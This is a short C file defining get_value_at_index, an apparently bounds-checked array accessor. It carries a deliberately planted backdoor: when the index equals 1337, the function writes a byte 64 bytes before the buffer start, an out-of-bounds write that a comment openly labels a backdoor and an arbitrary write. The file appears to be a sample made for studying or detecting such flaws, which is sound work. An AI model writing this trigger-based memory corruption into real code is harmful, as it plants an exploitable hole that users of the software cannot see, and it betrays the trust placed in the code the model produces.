#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (!ary || i < 0) return -1;

    char* ptr = ary + i;
    if (ptr >= ary + ary_size) return -1;
    
    // Backdoor: Trigger memory corruption if a specific condition is met
    if (i == 1337) {
        char* backdoor = ary - 0x40;
        *backdoor = 'B';  // Arbitrary write
    }

    return *ptr;
}
